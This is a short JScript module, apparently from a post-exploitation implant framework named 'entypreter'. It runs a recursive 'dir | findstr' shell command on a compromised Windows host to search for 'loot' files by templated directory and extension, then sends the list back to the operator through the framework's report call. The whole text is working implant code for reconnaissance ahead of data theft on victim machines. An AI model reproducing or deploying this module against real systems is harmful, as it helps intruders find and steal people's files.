try
{
    var tmpfile = "~DIRECTORY~\\" + entypreter.uuid() + ".txt";
    var loot = entypreter.shell.exec("dir ~LOOTD~ /s /b | findstr /I \"~LOOTE~ ~LOOTF~\"", tmpfile);
    entypreter.work.report(loot);
}
catch (e)
{
    entypreter.work.error(e)
}

entypreter.exit();
